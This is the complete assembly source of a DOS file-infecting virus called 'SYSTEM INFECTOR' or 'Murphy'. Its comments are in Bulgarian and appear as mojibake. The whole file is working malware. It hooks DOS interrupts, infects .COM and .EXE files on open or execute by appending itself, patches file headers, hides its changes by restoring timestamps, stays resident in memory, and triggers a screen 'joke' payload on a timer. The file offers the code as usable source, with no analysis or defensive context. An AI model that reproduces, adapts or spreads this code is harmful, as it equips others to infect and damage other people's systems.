

;
;	dynamic self loader
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;			     SYSTEM INFECTOR
;
;
;     Version 4.00 - Copywrite (c) 1989 by L.Mateew & Jany Brankow
;
;			  All rights reserved.
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

	page	,132

	title	SYSTEM INFECTOR

comp13		=	offset kt1 - offset org13
comp21		=	offset kt1 - offset new21
compbuff	=	offset kt1 - offset buffer
compbuff1	=	offset kt1 - offset buffer1
comp_code	=	offset kt1 - offset my_code
vir_length	=	offset endpr - offset entry_point
Cred		=	offset virus - offset credits


code	segment				; ­ © - ¢ ¦­¨¿ ±¥£¬¥­² !!!

	assume	cs:code			; ¨­¨¶¨ «¨§¨° ­¥ ­  CS

	org	100h			; ­ · «¥­  ¤°¥± ­  ¯°®£° ¬ ² 

entry_point:				; ¢µ®¤­  ²®·ª 
	jmp	point1			; ±ª®ª ¢ ¯°®£° ¬ ²  §  ³±² ­®¢¿¢ ­¥ ­  ¢¨°³± 

buffer	db	18h dup (0c3h)		; ·¥²¨°¨ ¯® RET
buffer1 db	4 dup (0c3h)		; ²°¨ ¯® RET
my_code dw	?
time	dw	?
date	dw	?
old_len dd	?
new21	dd	?			; ¬¿±²® §  ­®¢¨¿ ¢¥ª²®°
old24	dd	?
org13	dd	?
old13	dd	?


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;	   ‡  ­¥§ ª®­­® ª®¯¨° ­¥ ¹¥ ®²¨¤¥²¥ ¢ § ²¢®°  !
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
credits:
	db	' It''s me - Murphy. '
	db	' Copywrite (c)1990 by Lubo &'
	db	' Ian, Sofia, USM Laboratory. '

virus	proc	near			;
	call	time_kill		; ¯°®¢¥°ª  §  ¤ ²  ¨ · ±
	cmp	ax,4b00h+'M'		; „Ž‘ ´³­ª¶¨¿ EXEC ?
	jnz	@05
	push	bp
	mov	bp,sp
	and	word ptr [bp+6],0fffeh
	pop	bp
	iret
@05:
	cmp	ah,4bh			; „Ž‘ ´³­ª¶¨¿ EXEC ?
	jz	p0
	cmp	ax,3d00h		; „Ž‘ ´³­ª¶¨¿ OPEN ?
	jz	p0			; ¤  !
	cmp	ax,6c00h		; ¯°®¢¥°ª  §  DOS Fn 6C
	jnz	@04			; ¨¬  ¨ ¤°³£ ­ ·¨­
	cmp	bl,0			; ­®°¬ «­® ®²¢ °¿­¥
	jz	p0			; § ° §¿¢ ­¥
@04:
	jmp	do_not_bite		; ­¥ - ¯°¥µ®¤ ªº¬ ±² °¨¿ ¢¥ª²®°
p0:					;
	push	es			; § ¯ §¢ ­¥ ­  ES ,
	push	ds			; DS ,
	push	di			; DI ,
	push	si			; SI ,
	push	bp			; BP ,
	push	dx			; DX ,
	push	cx			; CX ,
	push	bx			; BX ,
	push	ax			; ¨ AX
	call	ints_on
	call	ints_off
	cmp	ax,6c00h		; ¯°®¢¥°ª  §  OPEN
	jnz	kt6			; ¯°¥±ª · ­¥
	mov	dx,si			; ¡¥§ ¤³¬¨
kt6:
	mov	cx,80h			; ¬ ª±¨¬ «­  ¤º«¦¨­  ­  ´ ©«®¢ ² 
	mov	si,dx			; ±¯¥¶¨´¨ª ¶¨¿
while_null:				;
	inc	si			; ¯®«³· ¢ ­¥ ­ 
	mov	al,byte ptr ds:[si]	; ´ ©«®¢ ² 
	or	al,al			; ±¯¥¶¨´¨ª ¶¨¿
	loopne	while_null		; ª° © ­  ASCIIZ ?
	sub	si,02h			; 2 ±¨¬¢®«  ­ § ¤
	cmp	word ptr ds:[si],'MO'	; ¯°®¢¥°ª  §  .COM - ´ ©«
	jz	@03
	cmp	word ptr ds:[si],'EX'
	jz	@06
go_away:
	jmp	@01			; ¦ «ª® -> no_ill_it
@06:
	cmp	word ptr ds:[si-2],'E.' ;
	jz	go_forward		;
	jmp	short go_away
@03:
	cmp	word ptr ds:[si-2],'C.' ; ®¹¥ ­¨¹® ­¥ ¥ § £³¡¥­®...
	jnz	go_away			; .COM ´ ©«
go_forward:				;
	mov	ax,3d02h		; „Ž‘ ´³­ª¶¨¿ 3d /®²¢ °¿­¥ ­  ´ ©«/ - °¥¦¨¬ ­  ¤®±²º¯ 010b - ·¥²¥­¥ ¨ § ¯¨±
	call	int_21			; ¢°º¹  ´ ©«®¢¨¿ ¬ ­¨¯³« ²®° ¢ AX  ª® CF = 0
	jc	@01			;
	mov	bx,ax			; § ¯ §¢ ­¥ ­  ´ ©«®¢¨¿ ¬ ­¨¯³« ²®° ¢ BX
	mov	ax,5700h		;
	call	int_21			;
	mov	cs:[time],cx		;
	mov	cs:[date],dx		;
	mov	ax,4200h		; „Ž‘ ´³­ª¶¨¿ 42
	xor	cx,cx			; ­³«¨° ­¥ ­  CX
	xor	dx,dx			; ³±² ­®¢¿¢ ­¥ ­  ³ª § ²¥«¿ ¢ ­ · «®²® ­  ´ ©« 
	call	int_21			; INT 21
	push	cs			; ³±² ­®¢¿¢ ­¥
	pop	ds			; DS := CS
	mov	dx,offset buffer	; ¨§·¨±«¿¢ ­¥ ­   ¤°¥±  ­  buffer
	mov	si,dx
	mov	cx,0018h		; ¸¥±² ¡ ©² 
	mov	ah,3fh			; „Ž‘ ´³­ª¶¨¿ 3FH /·¥²¥­¥ ®² ´ ©«/
	call	int_21			; ¯°®·¨² ­¥ ­  ¯º°¢¨²¥ 8 ¡ ©²  ¢ buffer
	jc	close_file
	cmp	word ptr ds:[si],'ZM'
	jnz	@07
	call	exe_file
	jmp	short	close_file
@07:
	call	com_file
close_file:
	jc	skip_restore_date
	mov	ax,5701h
	mov	cx,cs:[time]
	mov	dx,cs:[date]
	call	int_21
skip_restore_date:
	mov	ah,3eh			; „Ž‘ ´³­ª¶¨¿ 3E - § ²¢ °¿­¥ ­  ´ ©«
	call	int_21			; INT 21
@01:
	call	ints_off
	pop	ax			; ¢º§±² ­®¢¿¢ ­¥ ­  AX ,
	pop	bx			; BX ,
	pop	cx			; CX ,
	pop	dx			; DX ,
	pop	bp			; BP ,
	pop	si			; SI ,
	pop	di			; DI ,
	pop	ds			; DS ,
	pop	es			; ES
do_not_bite:
	jmp	dword ptr cs:[new21]	; ¯°¥µ®¤ ªº¬ ±² °¨¿ ¢¥ª²®°
virus	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		Subroutine for .EXE file
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

exe_file	proc	near
	mov	cx,word ptr ds:[si+16h] ; § °¥¦¤ ­¥ ­  ®²¬¥±²¢ ­¥²® ­  CS ¡ ¯ ° £° ´¨
	add	cx,word ptr ds:[si+08h] ; ±º¡¨° ­¥ ­  ¯°¥´¨ª±  (¢ ¯ ° £° ´¨) ± ­¥£®
	mov	ax,10h
	mul	cx			; ³¬­®¦ ¢ ¬¥ £¨ ± 10h ¨ ¯®«³· ¢ ¬¥
	add	ax,word ptr ds:[si+14h] ;  ¡±®«¾²­®²® ®²¬¥±²¢ ­¥ ­ 
	adc	dx,0			; ¢µ®¤­ ²  ²®·ª  ª ²® ±º¡¨° ¬¥ ¨ IP
	push	dx			; § ¯ §¢ ¬¥ £¨ ¢ ±²¥ª  §  ¯®-­ ² ²ºª
	push	ax
	mov	ax,4202h		; µ¢ ²ª  §  ¯®«³· ¢ ­¥
	xor	cx,cx
	xor	dx,dx			; ­  ¤º«¦¨­ ²  ­ 
	call	int_21			; ´ ©«  ¢ DX:AX
	cmp	dx,0
	jnz	go_out			; ¯°®¢¥°ª  §  ¤º«¦¨­ ²  ­ 
	cmp	ax,vir_length		; ´ ©«  µ °¥± ­ ®² ¢¨°³± 
	jnb	go_out			;  ª® ¥ ¢¥·¥ µ °¥± ­ ®² ­¥£® -
	pop	ax			; Go out !
	pop	dx
	stc
	ret
go_out:
	mov	di,ax			; § ¯ §¢ ­¥ ­  AX ¢ DI
	mov	bp,dx			; ¨ DX ¢ BP
	pop	cx			; ¨§¢ ¦¤ ¬¥ ®²¬¥±²¢ ­¥²® ­ 
	sub	ax,cx			; ¢µ®¤­ ²  ²®·ª  ®² ¤º«¦¨­ ²  ­  ´ ©« 
	pop	cx			; ¨ ¯®«³· ¢ ¬¥ ¤º«¦¨­ ²  ­ 
	sbb	dx,cx			; ¯°®£° ¬ ²  ±«¥¤ ¢µ®¤­ ²  ²®·ª 
	cmp	word ptr ds:[si+0ch],00h; ¯°®¢¥°ª  §  ®¯¶¨¿
	je	exitp			; /HIGH
	cmp	dx,0			; ±° ¢­¿¢ ¬¥ £¨ ± ¤º«¦¨­ ²  ­  ¢¨°³± 
	jne	ill_it			; ¨  ª® ­  ±  ° ¢­¨ «¥¯¢ ¬¥ £® ² ¬ ¨
	cmp	ax,vir_length		; ².­. . . .
	jne	ill_it
	stc
	ret
ill_it:
	mov	dx,bp			; ¯°®·¨² ¬¥ ¤º«¦¨­ ²  ­ 
	mov	ax,di			; ­  ¯°®£° ¬ ² 
	push	dx			; push ¢ ¬¥ £¨
	push	ax			; §  ¯®-­ ² ²ºª
	add	ax,vir_length		; ±º¡¨° ¬¥ ¿ ±
	adc	dx,0			; ¤º«¦¨­ ²  ­  Murphy
	mov	cx,512			; ¤¥«¨¬ ¿ ­  512 ¡ ©² 
	div	cx
	les	di,dword ptr ds:[si+02h]; § °¥¦¤ ­¥ ­  ±² ° ²  ¤º«¦¨­ 
	mov	word ptr cs:[old_len],di; § ¯ §¢ ­¥ ¢ ²¿«®²®
	mov	word ptr cs:[old_len+2],es;§ ¯ §¢ ­¥ ¢ ²¿«®²®
	mov	word ptr ds:[si+02h],dx ; ¨ ¿ § ¯¨±¢ ¬¥
	cmp	dx,0
	jz	skip_increment
	inc	ax
skip_increment:
	mov	word ptr ds:[si+04h],ax ; ¢ ¡³´¥° 
	pop	ax			; ·¥²¥¬ ¤º«¦¨­ ²  ­  ´ ©« 
	pop	dx			; ®² ±²¥ª 
	call	div10h			; ¤¥«¨¬ ¿ ­  10h ¨ ¿ ¯®«³· ¢ ¬¥ ¢ AX:DX
	sub	ax,word ptr ds:[si+08h] ; ¨§¢ ¦¤ ¬¥ ¯°¥´¨ª± 
	les	di,dword ptr ds:[si+14h]; ¯°®·¨² ­¥ ­  ±² °¨²¥
	mov	word ptr ds:[buffer1],di; CS:IP ¨ § ¯¨±
	mov	word ptr ds:[buffer1+02h],es ; ¢ ²¿«®²®
	mov	word ptr ds:[si+14h],dx ; § ¯¨± ­  ­®¢¨¿ IP ¢ ¡³´¥° 
	mov	word ptr ds:[si+16h],ax ; § ¯¨± ­  ­®¢¨¿ CS ¢ ¡³´¥° 
	mov	word ptr ds:[my_code],ax; § ¯¨± ­  ­®¢¨¿ CS ¢º¢ ²¿«®²®
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	call	int_21
	call	paste
	jc	exitp
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	call	int_21
	mov	ah,40h
	mov	dx,si
	mov	cx,18h
	call	int_21
exitp:
	ret

exe_file	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		  Subroutine for dividing
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
div10h	proc	near
	mov	cx,04h
	mov	di,ax
	and	di,000fh
dividing:
	shr	dx,1
	rcr	ax,1
	loop	dividing
	mov	dx,di
	ret
div10h	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		Subroutine for virus moving
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

paste	proc	near
	mov	ah,40h			; „Ž‘ ´³­ª¶¨¿ 40h /§ ¯¨± ¢º¢ ´ ©« ¨«¨ ³±²°®©±²¢®/
	mov	cx,vir_length		; ¨§·¨±«¿¢ ­¥ ¤º«¦¨­ ²  ­  ¢¨°³± 
	mov	dx,offset entry_point	; DS:DX ²°¿¡¢  ¤  ±®· ²  ¤°¥±  ­  § ¯¨± 
	call	ints_on			; § ®¡¨ª «¿­¥ ­  · ±®¢­¨ª  (R/W)
	jmp	int_21			; § ¯¨± ¢º¢ ´ ©« 
paste	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		Subroutine for .COM file
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

com_file      proc    near

	mov	ax,4202h		; „Ž‘ ´³­ª¶¨¿ 42 /¯°¥¬¥±²¢ ­¥ ­  ²¥ª³¹¨¿ ³ª § ²¥« ¢º¢ ´ ¨«  /AL=2 - ¢ ª° ¿/
	xor	cx,cx			; ³±² ­®¢¿¢ ­¥ ­  °¥£¨±²°¨²¥
	xor	dx,dx			; CX ¨ DX / ª® CX:DX = 0 , ¢ DX:AX ±¥ ¯®«³· ¢  ¤º«¦¨­ ²  ­  ´ ©« /
	call	int_21			; ³±² ­®¢¿¢ ­¥ ¢ ª° ¿ ­  ´ ©« 
	cmp	ax,vir_length		; ±° ¢­¿¢ ­¥ ­  ¤º«¦¨­ ²  ­  ¢¨°³± 
	jb	short no_ill_it		; ± ¯°®£° ¬ ²  ¨ ¯°¥µ®¤ ¢ ª° ¿  ª®
	cmp	ax,64000		; ¤º«¦¨­ ²  ­  ¯°®£° ¬ ²  ¥ < ¤º«¦.="" ­ ="" jnb="" short="" no_ill_it="" ;="" ¢¨°³± ="" ¨«¨=""> 0ffff-¤º«¦. ­  ¢¨°³±  - 20h
	push	ax			; ±ºµ° ­¿¢ ­¥ ­  AX
	cmp	byte ptr ds:[si],0E9h	; ¯°®¢¥°ª  §  JMP ¢ ­ · «®²® ­  ¯°®£° ¬ ² 
	jnz	illing			; ¥? -  Œ¥°±¨! ’®£ ¢  § ° §¿¢ ¬¥.
	sub	ax,vir_length + 3	; ¯®«³· ¢ ­¥ ­  ¤º«¦¨­ ²  ­  ¯°®£° ¬ ²  ¡¥§ ¢¨°³±  /¥¢¥­²³ «­®/
	cmp	ax,ds:[si+1]		; ¯°®¢¥°ª  §  ¯°®£° ¬ ²  § «¥¯¥­  ¢ ª° ¿
	jnz	illing			; ¥? ...
	pop	ax			; ®±¢®¡®¦¤ ¢ ­¥ ­  ±²¥ª 
	stc
	ret
illing:
	call	paste
	jnc	skip_paste
	pop	ax
	ret
skip_paste:
	mov	ax,4200h		; „Ž‘ ´³­ª¶¨¿ 42
	xor	cx,cx			; ­³«¨° ­¥ ­  CX
	xor	dx,dx			; ³±² ­®¢¿¢ ­¥ ­  ³ª § ²¥«¿ ¢ ­ · «®²® ­  ´ ©« 
	call	int_21			; ¨§¯º«­¥­¨¥ ­  ´³­ª¶¨¿² 
	pop	ax			; ·¥²¥­¥ ­  AX
	sub	ax,03h			; ¨§·¨±«¿¢ ­¥ ­  ®¯¥° ­¤  ­  JMP- 
	mov	dx,offset buffer1	; § ¤ ¢ ­¥ ­   ¤°¥±  ­  § ¯¨±  ¢ DS:DX
	mov	si,dx
	mov	byte ptr cs:[si],0e9h	; § ¯¨± ­  09H (JMP) ¢ ­ · «®²® ­  ´ ©« 
	mov	word ptr cs:[si+1],ax	; ®¯¥° ­¤  ­  JMP-  ¢ ¯®«¥²® §  § ¯¨±
	mov	ah,40h			; „Ž‘ ´³­ª¶¨¿ 40h /§ ¯¨± ¢º¢ ´ ©« ¨«¨ ³±²°®©±²¢®/
	mov	cx,3			; § ¯¨± ± ¬® ­  3 ¡ ©² 
	call	int_21			; ¨§¯º«­¥­¨¥ ­  ´³­ª¶¨¿² 
no_ill_it:
	ret

com_file      endp



;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		Subroutine for calling of an 'int 21h'
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

int_21	proc	near
	pushf
	call	dword ptr [new21]
	ret
int_21	endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;	   This subroutine changes the int 24h vector to me
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
ints_on        proc    near
	push	ax
	push	ds
	push	es
	xor	ax,ax
	push	ax
	pop	ds
	cli
	les	ax,dword ptr ds:[24h*4]
	mov	word ptr cs:[old24],ax
	mov	word ptr cs:[old24+2],es
	mov	ax,offset int_24
	mov	word ptr ds:[24h*4],ax
	mov	word ptr ds:[24h*4+2],cs
	les	ax,dword ptr ds:[13h*4]
	mov	word ptr cs:[old13],ax
	mov	word ptr cs:[old13+2],es
	les	ax,dword ptr cs:[org13]
	mov	word ptr ds:[13h*4],ax
	mov	word ptr ds:[13h*4+2],es
	sti
	pop	es
	pop	ds
	pop	ax
	ret
ints_on        endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;	      This subroutine restores the int 24h vector
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
ints_off	proc  near
	push	ax
	push	ds
	push	es
	xor	ax,ax
	push	ax
	pop	ds
	cli
	les	ax,dword ptr cs:[old24]
	mov	word ptr ds:[24h*4],ax
	mov	word ptr ds:[24h*4+2],es
	les	ax,dword ptr cs:[old13]
	mov	word ptr ds:[13h*4],ax
	mov	word ptr ds:[13h*4+2],es
	sti
	pop	es
	pop	ds
	pop	ax
	ret
ints_off	endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		This subroutine works the int 24h
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
int_24	proc	far
	mov	al,3
	iret
int_24	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		  Œ ©² ¯ ± ¡¥§§ ¹¨²­¨²¥ µ®°¨¶ 
;
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

joke	proc	far
	push	ax			; § ¯ §¢ ­¥
	push	bx
	push	cx			; ­ 
	push	dx
	push	si
	push	di
	push	bp
	push	ds			; °¥£¨±²°¨²¥
	push	es
	xor	ax,ax
	push	ax
	pop	ds
	mov	bh,ds:[462h]
	mov	ax,ds:[450h]
	mov	cs:[old_pos],ax
	mov	ax,cs:[pos_value]
	mov	word ptr ds:[450h],ax
	mov	ax,word ptr cs:[spot_buff]
	mov	bl,ah
	mov	ah,09h
	mov	cx,1
	int	10h
	call	change_pos
	call	push_spot
	mov	ax,cs:pos_value
	mov	word ptr ds:[450h],ax
	mov	bl,07h
	mov	ax,0907h
	mov	cx,1
	int	10h
	mov	ax,cs:[old_pos]
	mov	ds:[450h],ax
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	dword ptr cs:[old_1ch]


spot_buff	dw	?
pos_value	dw	1010h
direction	db	0
old_1ch		dd	?
old_pos		dw	?

change_pos	proc	near
	mov	ax,cs:[pos_value]
	mov	bx,word ptr ds:[44ah]
	dec	bx
	test	cs:[direction],00000001b
	jz	@001
	cmp	al,bl
	jb	@002
	xor	cs:[direction],00000001b
	jmp	short @002
@001:
	cmp	al,0
	jg	@002
	xor	cs:[direction],00000001b
@002:
	test	cs:[direction],00000010b
	jz	@003
	cmp	ah,24
	jb	@005
	xor	cs:[direction],00000010b
	jmp	short @005
@003:
	cmp	ah,0
	jg	@005
	xor	cs:[direction],00000010b
@005:
	cmp	byte ptr cs:spot_buff,20h
	je	skip_let
	cmp	byte ptr cs:[pos_value+1],0
	je	skip_let
	xor	cs:[direction],00000010b
skip_let:
	test	cs:[direction],00000001b
	jz	@006
	inc	byte ptr cs:[pos_value]
	jmp	short @007
@006:
	dec	byte ptr cs:[pos_value]
@007:
	test	cs:[direction],00000010b
	jz	@008
	inc	byte ptr cs:[pos_value+1]
	jmp	short @009
@008:
	dec	byte ptr cs:[pos_value+1]
@009:
	ret
change_pos	endp

push_spot	proc	near
	mov	ax,cs:[pos_value]
	mov	word ptr ds:[450h],ax
	mov	bh,ds:[462h]
	mov	ah,08h
	int	10h
	mov	word ptr cs:[spot_buff],ax
	ret
push_spot	endp
joke	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		Subroutine for check current time
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

time_kill	proc	near		;
	push	ax			; § ¯ §¢ ­¥
	push	bx
	push	cx			; ­ 
	push	dx
	push	si
	push	di
	push	bp
	push	ds			; °¥£¨±²°¨²¥
	push	es
	xor	ax,ax			; ¯®«³· ¢ ­¥ ­ 
	push	ax
	pop	ds
	cmp	word ptr ds:[1Ch*4],offset joke
	je	next_way
	mov	ax,ds:[46ch]
	mov	dx,ds:[46ch+2]
	mov	cx,0ffffh
	div	cx
	cmp	ax,10
	jne	next_way
	cli
	mov	bp,word ptr ds:[450h]
	call	push_spot
	mov	ds:[450h],bp
	les	ax,ds:[1ch*4]
	mov	word ptr cs:[old_1ch],ax
	mov	word ptr cs:[old_1ch+2],es
	mov	word ptr ds:[1Ch*4],offset joke
	mov	word ptr ds:[1Ch*4+2],cs
	sti
next_way:
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret
time_kill	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		Subroutine for multiplication
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_10		proc	near
		mov	dx,10h
		mul	dx				; dx:ax = reg * ax
		ret
sub_10		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;		     ? ? ? ? ? ? ? ?
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
zero_regs	proc	near

	xor	ax,ax
	xor	bx,bx
	xor	cx,cx
	xor	dx,dx
	xor	si,si
	xor	di,di
	xor	bp,bp
	ret

zero_regs	endp


point1:					;
	push	ds
	call	kt1			; ²°¨ª § 
kt1:					; ¨§·¨±«¿¢ ­¥ ­  ®²¬¥±²¢ ­¥²®
	mov	ax,4b00h + 'M'		; ­  kt1
	int	21h
	jc	stay
	jmp	go_to_program		;
stay:					;
	pop	si			;
	push	si			;
	mov	di,si			;
	xor	ax,ax			; Zero register
	push	ax			;
	pop	ds			;
	les	ax,ds:[13h*4]		; (0000:004C=6E5h) Load 32 bit ptr
	mov	cs:[si-comp13],ax	; (64BB:06F4=9090h)
	mov	cs:[si-comp13+2],es	; (64BB:06F6=9090h)
	les	bx,ds:[21h*4]
	mov	word ptr cs:[di-comp21],bx     ; ®²¬¥±²¢ ­¥
	mov	word ptr cs:[di-comp21+2],es   ; ±¥£¬¥­²
	mov	ax,ds:[102h]		; (0000:0102=0F000h)
	cmp	ax,0F000h
	jne	loc_14			; Jump if not equal
	mov	dl,80h
	mov	ax,ds:[106h]		; (0000:0106=0C800h)
	cmp	ax,0F000h
	je	loc_7			; Jump if equal
	cmp	ah,0C8h
	jb	loc_14			; Jump if below
	cmp	ah,0F4h
	jae	loc_14			; Jump if above or =
	test	al,7Fh			; ''
	jnz	loc_14			; Jump if not zero
	mov	ds,ax
	cmp	word ptr ds:[0],0AA55h	; (C800:0000=0AA55h)
	jne	loc_14			; Jump if not equal
	mov	dl,ds:[02h]		; (C800:0002=10h)
loc_7:
	mov	ds,ax
	xor	dh,dh			; Zero register
	mov	cl,9
	shl	dx,cl			; Shift w/zeros fill
	mov	cx,dx
	xor	si,si			; Zero register

locloop_8:
	lodsw				; String [si] to ax
	cmp	ax,0FA80h
	jne	loc_9			; Jump if not equal
	lodsw				; String [si] to ax
	cmp	ax,7380h
	je	loc_10			; Jump if equal
	jnz	loc_11			; Jump if not zero
loc_9:
	cmp	ax,0C2F6h
	jne	loc_12			; Jump if not equal
	lodsw				; String [si] to ax
	cmp	ax,7580h
	jne	loc_11			; Jump if not equal
loc_10:
	inc	si
	lodsw				; String [si] to ax
	cmp	ax,40CDh
	je	loc_13			; Jump if equal
	sub	si,3
loc_11:
	dec	si
	dec	si
loc_12:
	dec	si
	loop	locloop_8		; Loop if cx > 0
	jmp	short loc_14
loc_13:
	sub	si,7
	mov	cs:[di-comp13],si	; (64BB:06F4=9090h)
	mov	cs:[di-comp13+2],ds	; (64BB:06F6=9090h)
loc_14:
	mov	ah,62h
	int	21h
	mov	es,bx
	mov	ah,49h				; 'I'
	int	21h				; DOS Services	ah=function 49h,
						;  release memory block, es=seg
	mov	bx,0FFFFh
	mov	ah,48h				; 'H'
	int	21h				; DOS Services	ah=function 48h,
						;  allocate memory, bx=bytes/16
	sub	bx,vir_length/10h+2
	jc	go_to_program			; Jump if carry Set
	mov	cx,es
	stc					; Set carry flag
	adc	cx,bx
	mov	ah,4Ah				; 'J'
	int	21h				; DOS Services	ah=function 4Ah,
						;  change mem allocation, bx=siz
	mov	bx,vir_length/10h+1
	stc					; Set carry flag
	sbb	es:[02h],bx			; (FF95:0002=0B8CFh)
	push	es
	mov	es,cx
	mov	ah,4Ah				; 'J'
	int	21h				; DOS Services	ah=function 4Ah,
						;  change mem allocation, bx=siz
	mov	ax,es
	dec	ax
	mov	ds,ax
	mov	word ptr ds:[01h],08h		; (FEAD:0001=1906h)
	call	sub_10
	mov	bx,ax
	mov	cx,dx
	pop	ds
	mov	ax,ds
	call	sub_10
	add	ax,ds:[06h]			; (FF95:0006=0C08Eh)
	adc	dx,0
	sub	ax,bx
	sbb	dx,cx
	jc	allright			; Jump if carry Set
	sub	ds:[06h],ax			; (FF95:0006=0C08Eh)
allright:
	mov	si,di			;
	xor	di,di			; ®²¬¥±²¢ ­¥ ±¯°¿¬® ±¥£¬¥­² 
	push	cs			; ³±² ­®¢¿¢ ­¥ ­ 
	pop	ds			; °¥£¨±²°¨²¥
	sub	si,offset kt1 - offset entry_point   ; DS:SI
	mov	cx,vir_length		; ¨§·¨±«¿¢ ­¥ ° §¬¥° 
	inc	cx			; ­  ¢¨°³± 
	rep	movsb			; ¯°¥µ¢º°«¿­¥ ­  ¢¨°³± 
	mov	ah,62h
	int	21h
	dec	bx
	mov	ds,bx
	mov	byte ptr ds:[0],5ah
	mov	dx,offset virus		; DX - ®²¬¥±²¢ ­¥ ­  ­®¢¨¿ ¢¥ª²®°
	xor	ax,ax
	push	ax
	pop	ds
	mov	ax,es
	sub	ax,10h
	mov	es,ax
	cli
	mov	ds:[21h*4],dx
	mov	ds:[21h*4+2],es
	sti
	dec	byte ptr ds:[47bh]
go_to_program:				;
	pop	si			; § °¥¦¤ ­¥ ­  SI ®² ±²¥ª 
	cmp	word ptr cs:[si-compbuff],'ZM'
	jnz	com_ret


exe_ret proc	far

	pop	ds
	mov	ax,word ptr cs:[si-comp_code]
	mov	bx,word ptr cs:[si-compbuff1+2]
	push	cs
	pop	cx
	sub	cx,ax
	add	cx,bx
	push	cx
	push	word ptr cs:[si-compbuff1]
	push	ds
	pop	es
	call	zero_regs		; ­³«¨° ­¥ ­  °¥£¨±²°¨²¥
	ret

exe_ret endp


com_ret:
	pop	ax
	mov	ax,cs:[si-compbuff]	;
	mov	cs:[100h],ax		; ¢º§±² ­®¢¿¢ ­¥
	mov	ax,cs:[si-compbuff+2]	; ®°¨£¨­ «­¨²¥
	mov	cs:[102h],ax		; ¨­±²°³ª¶¨¨
	mov	ax,100h			; ¯®£®²®¢ª  ­   ¤°¥± CS:100
	push	ax			;  ¤°¥± ­  ¢°º¹ ­¥ cs:ax
	push	cs			; ¢º§±² ­®¢¿¢ ­¥ ­ 
	pop	ds			; DS
	push	ds			; ¨
	pop	es			; ES
	call	zero_regs		; ­³«¨° ­¥ ­  °¥£¨±²°¨²¥
	ret				; ¯°¥µ®¤ ¢ ­ · «®²® ­  ¯°®£° ¬ ² 
endpr:					; ª° © ­  ¯°®¶¥¤³° ² 

code	ends				; ª° © ­  ¯°®£° ¬ ² 
